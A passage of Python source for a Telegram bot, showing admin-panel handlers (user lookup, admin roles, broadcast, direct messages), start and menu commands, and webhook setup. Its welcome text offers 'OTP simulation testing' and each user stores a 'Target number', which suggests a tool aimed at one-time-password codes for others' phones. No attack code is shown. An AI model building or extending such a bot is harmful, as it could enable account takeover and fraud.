            else:
                target = get_user_target(uid) or "None"
                text = f"👤 <b>User {uid}</b>\nUsername: @{user['username']}\nName: {user['first_name']}\nRole: {user['role']}\nBanned: {bool(user['banned'])}\nTarget number: {target}{BRANDING}"
                await update.message.reply_text(text, parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text("Invalid user ID.")
        await update.message.reply_text("Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Admin Panel", callback_data="admin_panel")]]))
        context.user_data.clear()
        return

    elif state == STATE_AWAITING_ADMIN_ADDADMIN:
        try:
            uid = int(update.message.text)
            set_admin_role(uid, True)
            await update.message.reply_text(f"✅ User {uid} is now admin.")
        except:
            await update.message.reply_text("Invalid user ID.")
        await update.message.reply_text("Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Admin Panel", callback_data="admin_panel")]]))
        context.user_data.clear()
        return

    elif state == STATE_AWAITING_ADMIN_REMOVEADMIN:
        try:
            uid = int(update.message.text)
            set_admin_role(uid, False)
            await update.message.reply_text(f"✅ User {uid} is no longer admin.")
        except:
            await update.message.reply_text("Invalid user ID.")
        await update.message.reply_text("Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Admin Panel", callback_data="admin_panel")]]))
        context.user_data.clear()
        return

    elif state == STATE_AWAITING_ADMIN_BROADCAST:
        # Broadcast the message (or forward)
        users = get_all_user_ids()
        success = 0
        text = update.message.text
        for uid in users:
            if await send_any_message(context, uid, update, text):
                success += 1
        await update.message.reply_text(f"📢 Broadcast sent to {success}/{len(users)} users.")
        await update.message.reply_text("Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Admin Panel", callback_data="admin_panel")]]))
        context.user_data.clear()
        return

    elif state == STATE_AWAITING_ADMIN_DM:
        try:
            target = int(update.message.text)
            context.user_data['dm_target'] = target
            context.user_data['state'] = STATE_AWAITING_ADMIN_DM_TEXT
            await update.message.reply_text(
                "Now send the message you want to DM (text or reply to a message).",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
            )
        except:
            await update.message.reply_text("Invalid user ID.")
            await update.message.reply_text("Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Admin Panel", callback_data="admin_panel")]]))
            context.user_data.clear()
        return

    elif state == STATE_AWAITING_ADMIN_DM_TEXT:
        target = context.user_data.get('dm_target')
        if not target:
            await update.message.reply_text("Something went wrong. Try again.")
            await update.message.reply_text("Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Admin Panel", callback_data="admin_panel")]]))
            context.user_data.clear()
            return
        # Send message
        success = await send_any_message(context, target, update, update.message.text)
        if success:
            await update.message.reply_text(f"Message sent to {target}.")
        else:
            await update.message.reply_text("Failed to send message.")
        await update.message.reply_text("Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Admin Panel", callback_data="admin_panel")]]))
        context.user_data.clear()
        return

    else:
        # If no state, ignore or show help
        await update.message.reply_text(
            "Please use the menu buttons to interact.",
            reply_markup=get_main_menu(user_id)
        )

# ------------------------------------------------------------------
# Helper: send any message (text or media) – unchanged from original
# ------------------------------------------------------------------
async def send_any_message(context, chat_id, update, text=None):
    if update.message.reply_to_message:
        try:
            await context.bot.copy_message(
                chat_id=chat_id,
                from_chat_id=update.effective_chat.id,
                message_id=update.message.reply_to_message.message_id
            )
            return True
        except Exception as e:
            logger.error(f"Failed to copy message: {e}")
            if text:
                await context.bot.send_message(chat_id=chat_id, text=text)
            return False
    else:
        if text:
            await context.bot.send_message(chat_id=chat_id, text=text)
            return True
    return False

# ------------------------------------------------------------------
# Start command
# ------------------------------------------------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    add_user(user.id, user.username, user.first_name)
    await update.message.reply_text(
        f"Welcome {user.first_name}! 👋\n\nI'm here to assist you with OTP simulation testing.\n\n"
        f"Use the buttons below to interact.",
        parse_mode=ParseMode.HTML,
        reply_markup=get_main_menu(user.id)
    )

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Main Menu:",
        reply_markup=get_main_menu(update.effective_user.id)
    )

# ------------------------------------------------------------------
# Error handler
# ------------------------------------------------------------------
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")

# ------------------------------------------------------------------
# Main webhook setup
# ------------------------------------------------------------------
def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", menu))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_input))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_error_handler(error_handler)

    if WEBHOOK_URL:
        webhook_url = f"{WEBHOOK_URL}/webhook"
        logger.info(f"Starting webhook on {webhook_url}")
        app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path="webhook",
            webhook_url=webhook_url
        )
    else:
        logger.error("No WEBHOOK_URL set. Exiting.")
        exit(1)

if __name__ == "__main__":
    main()
